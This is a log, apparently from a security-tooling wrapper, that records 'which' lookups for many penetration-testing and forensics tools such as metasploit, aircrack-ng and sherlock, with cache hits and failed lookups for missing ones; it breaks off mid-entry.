2025-10-24 06:15:27,316 - __main__ - INFO - 💾 Cache HIT for command: which angr
2025-10-24 06:15:27,316 - __main__ - INFO - 🔍 Cache MISS for command: which libc-database
2025-10-24 06:15:27,316 - __main__ - INFO - 🚀 EXECUTING: which libc-database
2025-10-24 06:15:27,316 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:27,317 - __main__ - INFO - 🆔 PROCESS: PID 3663 started
2025-10-24 06:15:27,317 - __main__ - INFO - 🆔 REGISTERED: Process 3663 - which libc-database...
2025-10-24 06:15:27,318 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3663
2025-10-24 06:15:27,322 - __main__ - INFO - 🧹 CLEANUP: Process 3663 removed from registry
2025-10-24 06:15:27,322 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.01s
2025-10-24 06:15:27,322 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:27,322 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 06:15:27,322 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:27,322 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which libc-database
2025-10-24 06:15:27,322 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:27,322 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 0 bytes
2025-10-24 06:15:27,322 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 06:15:27,322 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 06:15:27,322 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:27,322 - __main__ - INFO - 💾 Cache HIT for command: which pwninit
2025-10-24 06:15:27,322 - __main__ - INFO - 💾 Cache HIT for command: which steghide
2025-10-24 06:15:27,322 - __main__ - INFO - 🔍 Cache MISS for command: which hashpump
2025-10-24 06:15:27,322 - __main__ - INFO - 🚀 EXECUTING: which hashpump
2025-10-24 06:15:27,322 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:27,323 - __main__ - INFO - 🆔 PROCESS: PID 3668 started
2025-10-24 06:15:27,323 - __main__ - INFO - 🆔 REGISTERED: Process 3668 - which hashpump...
2025-10-24 06:15:27,323 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3668
2025-10-24 06:15:27,326 - __main__ - INFO - 🧹 CLEANUP: Process 3668 removed from registry
2025-10-24 06:15:27,326 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.00s
2025-10-24 06:15:27,326 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:27,326 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 06:15:27,326 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:27,326 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which hashpump
2025-10-24 06:15:27,326 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 06:15:27,326 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 0 bytes
2025-10-24 06:15:27,326 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 06:15:27,326 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 06:15:27,326 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:27,326 - __main__ - INFO - 💾 Cache HIT for command: which foremost
2025-10-24 06:15:27,326 - __main__ - INFO - 💾 Cache HIT for command: which exiftool
2025-10-24 06:15:27,326 - __main__ - INFO - 💾 Cache HIT for command: which strings
2025-10-24 06:15:27,326 - __main__ - INFO - 💾 Cache HIT for command: which xxd
2025-10-24 06:15:27,326 - __main__ - INFO - 💾 Cache HIT for command: which file
2025-10-24 06:15:27,326 - __main__ - INFO - 💾 Cache HIT for command: which photorec
2025-10-24 06:15:27,326 - __main__ - INFO - 💾 Cache HIT for command: which testdisk
2025-10-24 06:15:27,326 - __main__ - INFO - 💾 Cache HIT for command: which scalpel
2025-10-24 06:15:27,326 - __main__ - INFO - 💾 Cache HIT for command: which zsteg
2025-10-24 06:15:27,326 - __main__ - INFO - 💾 Cache HIT for command: which outguess
2025-10-24 06:15:27,326 - __main__ - INFO - 💾 Cache HIT for command: which trivy
2025-10-24 06:15:27,326 - __main__ - INFO - 💾 Cache HIT for command: which kube-bench
2025-10-24 06:15:27,326 - __main__ - INFO - 💾 Cache HIT for command: which checkov
2025-10-24 06:15:27,326 - __main__ - INFO - 💾 Cache HIT for command: which terrascan
2025-10-24 06:15:27,326 - __main__ - INFO - 💾 Cache HIT for command: which falco
2025-10-24 06:15:27,326 - __main__ - INFO - 🔍 Cache MISS for command: which clair
2025-10-24 06:15:27,326 - __main__ - INFO - 🚀 EXECUTING: which clair
2025-10-24 06:15:27,326 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:27,327 - __main__ - INFO - 🆔 PROCESS: PID 3673 started
2025-10-24 06:15:27,327 - __main__ - INFO - 🆔 REGISTERED: Process 3673 - which clair...
2025-10-24 06:15:27,327 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3673
2025-10-24 06:15:27,332 - __main__ - INFO - 🧹 CLEANUP: Process 3673 removed from registry
2025-10-24 06:15:27,332 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.01s
2025-10-24 06:15:27,332 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:27,332 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 06:15:27,332 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:27,332 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which clair
2025-10-24 06:15:27,332 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:27,332 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 0 bytes
2025-10-24 06:15:27,332 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 06:15:27,332 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 06:15:27,332 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:27,332 - __main__ - INFO - 💾 Cache HIT for command: which amass
2025-10-24 06:15:27,332 - __main__ - INFO - 💾 Cache HIT for command: which subfinder
2025-10-24 06:15:27,332 - __main__ - INFO - 💾 Cache HIT for command: which fierce
2025-10-24 06:15:27,332 - __main__ - INFO - 💾 Cache HIT for command: which dnsenum
2025-10-24 06:15:27,332 - __main__ - INFO - 💾 Cache HIT for command: which theharvester
2025-10-24 06:15:27,332 - __main__ - INFO - 💾 Cache HIT for command: which sherlock
2025-10-24 06:15:27,332 - __main__ - INFO - 🔍 Cache MISS for command: which social-analyzer
2025-10-24 06:15:27,332 - __main__ - INFO - 🚀 EXECUTING: which social-analyzer
2025-10-24 06:15:27,332 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:27,333 - __main__ - INFO - 🆔 PROCESS: PID 3678 started
2025-10-24 06:15:27,333 - __main__ - INFO - 🆔 REGISTERED: Process 3678 - which social-analyzer...
2025-10-24 06:15:27,334 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3678
2025-10-24 06:15:27,336 - __main__ - INFO - 🧹 CLEANUP: Process 3678 removed from registry
2025-10-24 06:15:27,336 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.00s
2025-10-24 06:15:27,336 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:27,336 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 06:15:27,336 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:27,336 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which social-analyzer
2025-10-24 06:15:27,336 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 06:15:27,336 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 0 bytes
2025-10-24 06:15:27,336 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 06:15:27,336 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 06:15:27,336 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:27,336 - __main__ - INFO - 💾 Cache HIT for command: which recon-ng
2025-10-24 06:15:27,336 - __main__ - INFO - 💾 Cache HIT for command: which maltego
2025-10-24 06:15:27,336 - __main__ - INFO - 💾 Cache HIT for command: which spiderfoot
2025-10-24 06:15:27,336 - __main__ - INFO - 💾 Cache HIT for command: which shodancli
2025-10-24 06:15:27,336 - __main__ - INFO - 🔍 Cache MISS for command: which censys-cli
2025-10-24 06:15:27,336 - __main__ - INFO - 🚀 EXECUTING: which censys-cli
2025-10-24 06:15:27,336 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:27,337 - __main__ - INFO - 🆔 PROCESS: PID 3683 started
2025-10-24 06:15:27,337 - __main__ - INFO - 🆔 REGISTERED: Process 3683 - which censys-cli...
2025-10-24 06:15:27,338 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3683
2025-10-24 06:15:27,342 - __main__ - INFO - 🧹 CLEANUP: Process 3683 removed from registry
2025-10-24 06:15:27,343 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.01s
2025-10-24 06:15:27,343 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:27,343 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 06:15:27,343 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:27,343 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which censys-cli
2025-10-24 06:15:27,343 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:27,343 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 0 bytes
2025-10-24 06:15:27,343 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 06:15:27,343 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 06:15:27,343 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:27,343 - __main__ - INFO - 🔍 Cache MISS for command: which have-i-been-pwned
2025-10-24 06:15:27,343 - __main__ - INFO - 🚀 EXECUTING: which have-i-been-pwned
2025-10-24 06:15:27,343 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:27,343 - __main__ - INFO - 🆔 PROCESS: PID 3688 started
2025-10-24 06:15:27,343 - __main__ - INFO - 🆔 REGISTERED: Process 3688 - which have-i-been-pwned...
2025-10-24 06:15:27,344 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3688
2025-10-24 06:15:27,348 - __main__ - INFO - 🧹 CLEANUP: Process 3688 removed from registry
2025-10-24 06:15:27,349 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.01s
2025-10-24 06:15:27,349 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:27,349 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 06:15:27,349 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:27,349 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which have-i-been-pwned
2025-10-24 06:15:27,349 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:27,349 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 0 bytes
2025-10-24 06:15:27,349 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 06:15:27,349 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 06:15:27,349 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:27,349 - __main__ - INFO - 🔍 Cache MISS for command: which metasploit
2025-10-24 06:15:27,349 - __main__ - INFO - 🚀 EXECUTING: which metasploit
2025-10-24 06:15:27,349 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:27,349 - __main__ - INFO - 🆔 PROCESS: PID 3693 started
2025-10-24 06:15:27,349 - __main__ - INFO - 🆔 REGISTERED: Process 3693 - which metasploit...
2025-10-24 06:15:27,350 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3693
2025-10-24 06:15:27,356 - __main__ - INFO - 🧹 CLEANUP: Process 3693 removed from registry
2025-10-24 06:15:27,356 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.01s
2025-10-24 06:15:27,356 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:27,356 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 06:15:27,356 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:27,356 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which metasploit
2025-10-24 06:15:27,356 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:27,356 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 0 bytes
2025-10-24 06:15:27,356 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 06:15:27,356 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 06:15:27,356 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:27,356 - __main__ - INFO - 💾 Cache HIT for command: which msfconsole
2025-10-24 06:15:27,356 - __main__ - INFO - 💾 Cache HIT for command: which exploit-db
2025-10-24 06:15:27,356 - __main__ - INFO - 💾 Cache HIT for command: which searchsploit
2025-10-24 06:15:27,356 - __main__ - INFO - 🔍 Cache MISS for command: which api-schema-analyzer
2025-10-24 06:15:27,356 - __main__ - INFO - 🚀 EXECUTING: which api-schema-analyzer
2025-10-24 06:15:27,356 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:27,357 - __main__ - INFO - 🆔 PROCESS: PID 3698 started
2025-10-24 06:15:27,357 - __main__ - INFO - 🆔 REGISTERED: Process 3698 - which api-schema-analyzer...
2025-10-24 06:15:27,358 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3698
2025-10-24 06:15:27,362 - __main__ - INFO - 🧹 CLEANUP: Process 3698 removed from registry
2025-10-24 06:15:27,362 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.01s
2025-10-24 06:15:27,362 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:27,362 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 06:15:27,362 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:27,362 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which api-schema-analyzer
2025-10-24 06:15:27,362 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:27,362 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 0 bytes
2025-10-24 06:15:27,362 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 06:15:27,362 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 06:15:27,362 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:27,362 - __main__ - INFO - 🔍 Cache MISS for command: which postman
2025-10-24 06:15:27,362 - __main__ - INFO - 🚀 EXECUTING: which postman
2025-10-24 06:15:27,362 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:27,362 - __main__ - INFO - 🆔 PROCESS: PID 3703 started
2025-10-24 06:15:27,362 - __main__ - INFO - 🆔 REGISTERED: Process 3703 - which postman...
2025-10-24 06:15:27,363 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3703
2025-10-24 06:15:27,365 - __main__ - INFO - 🧹 CLEANUP: Process 3703 removed from registry
2025-10-24 06:15:27,365 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.00s
2025-10-24 06:15:27,365 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:27,365 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 06:15:27,365 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:27,365 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which postman
2025-10-24 06:15:27,365 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 06:15:27,365 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 0 bytes
2025-10-24 06:15:27,365 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 06:15:27,365 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 06:15:27,365 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:27,365 - __main__ - INFO - 🔍 Cache MISS for command: which insomnia
2025-10-24 06:15:27,365 - __main__ - INFO - 🚀 EXECUTING: which insomnia
2025-10-24 06:15:27,365 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:27,366 - __main__ - INFO - 🆔 PROCESS: PID 3708 started
2025-10-24 06:15:27,366 - __main__ - INFO - 🆔 REGISTERED: Process 3708 - which insomnia...
2025-10-24 06:15:27,367 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3708
2025-10-24 06:15:27,371 - __main__ - INFO - 🧹 CLEANUP: Process 3708 removed from registry
2025-10-24 06:15:27,371 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.01s
2025-10-24 06:15:27,371 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:27,371 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 06:15:27,371 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:27,371 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which insomnia
2025-10-24 06:15:27,371 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:27,371 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 0 bytes
2025-10-24 06:15:27,371 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 06:15:27,371 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 06:15:27,371 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:27,371 - __main__ - INFO - 💾 Cache HIT for command: which curl
2025-10-24 06:15:27,371 - __main__ - INFO - 💾 Cache HIT for command: which httpie
2025-10-24 06:15:27,371 - __main__ - INFO - 💾 Cache HIT for command: which anew
2025-10-24 06:15:27,371 - __main__ - INFO - 💾 Cache HIT for command: which qsreplace
2025-10-24 06:15:27,371 - __main__ - INFO - 💾 Cache HIT for command: which uro
2025-10-24 06:15:27,371 - __main__ - INFO - 💾 Cache HIT for command: which kismet
2025-10-24 06:15:27,371 - __main__ - INFO - 💾 Cache HIT for command: which wireshark
2025-10-24 06:15:27,371 - __main__ - INFO - 💾 Cache HIT for command: which tshark
2025-10-24 06:15:27,371 - __main__ - INFO - 💾 Cache HIT for command: which tcpdump
2025-10-24 06:15:27,371 - __main__ - INFO - 💾 Cache HIT for command: which smbmap
2025-10-24 06:15:27,371 - __main__ - INFO - 🔍 Cache MISS for command: which sleuthkit
2025-10-24 06:15:27,371 - __main__ - INFO - 🚀 EXECUTING: which sleuthkit
2025-10-24 06:15:27,371 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:27,371 - __main__ - INFO - 🆔 PROCESS: PID 3713 started
2025-10-24 06:15:27,372 - __main__ - INFO - 🆔 REGISTERED: Process 3713 - which sleuthkit...
2025-10-24 06:15:27,372 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3713
2025-10-24 06:15:27,377 - __main__ - INFO - 🧹 CLEANUP: Process 3713 removed from registry
2025-10-24 06:15:27,377 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.01s
2025-10-24 06:15:27,377 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:27,377 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 06:15:27,377 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:27,377 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which sleuthkit
2025-10-24 06:15:27,377 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:27,377 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 0 bytes
2025-10-24 06:15:27,377 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 06:15:27,377 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 06:15:27,377 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:27,377 - __main__ - INFO - 💾 Cache HIT for command: which autopsy
2025-10-24 06:15:27,377 - __main__ - INFO - 💾 Cache HIT for command: which evil-winrm
2025-10-24 06:15:27,377 - __main__ - INFO - 💾 Cache HIT for command: which paramspider
2025-10-24 06:15:27,377 - __main__ - INFO - 💾 Cache HIT for command: which airmon-ng
2025-10-24 06:15:27,377 - __main__ - INFO - 💾 Cache HIT for command: which airodump-ng
2025-10-24 06:15:27,377 - __main__ - INFO - 💾 Cache HIT for command: which aireplay-ng
2025-10-24 06:15:27,377 - __main__ - INFO - 💾 Cache HIT for command: which aircrack-ng
2025-10-24 06:15:27,377 - __main__ - INFO - 💾 Cache HIT for command: which msfvenom
2025-10-24 06:15:27,377 - __main__ - INFO - 💾 Cache HIT for command: which msfconsole
2025-10-24 06:15:27,377 - __main__ - INFO - 🔍 Cache MISS for command: which graphql-scanner
2025-10-24 06:15:27,377 - __main__ - INFO - 🚀 EXECUTING: which graphql-scanner
2025-10-24 06:15:27,377 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:27,378 - __main__ - INFO - 🆔 PROCESS: PID 3718 started
2025-10-24 06:15:27,378 - __main__ - INFO - 🆔 REGISTERED: Process 3718 - which graphql-scanner...
2025-10-24 06:15:27,378 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3718
2025-10-24 06:15:27,382 - __main__ - INFO - 🧹 CLEANUP: Process 3718 removed from registry
2025-10-24 06:15:27,382 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.00s
2025-10-24 06:15:27,382 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:27,382 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 06:15:27,382 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:27,382 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which graphql-scanner
2025-10-24 06:15:27,382 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 06:15:27,382 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 0 bytes
2025-10-24 06:15:27,382 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 06:15:27,382 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 06:15:27,382 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:27,382 - __main__ - INFO - 🔍 Cache MISS for command: which jwt-analyzer
2025-10-24 06:15:27,382 - __main__ - INFO - 🚀 EXECUTING: which jwt-analyzer
2025-10-24 06:15:27,382 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:27,383 - __main__ - INFO - 🆔 PROCESS: PID 3723 started
2025-10-24 06:15:27,383 - __main__ - INFO - 🆔 REGISTERED: Process 3723 - which jwt-analyzer...
2025-10-24 06:15:27,384 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3723
2025-10-24 06:15:27,386 - __main__ - INFO - 🧹 CLEANUP: Process 3723 removed from registry
2025-10-24 06:15:27,386 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.00s
2025-10-24 06:15:27,386 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:27,386 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 06:15:27,386 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:27,386 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which jwt-analyzer
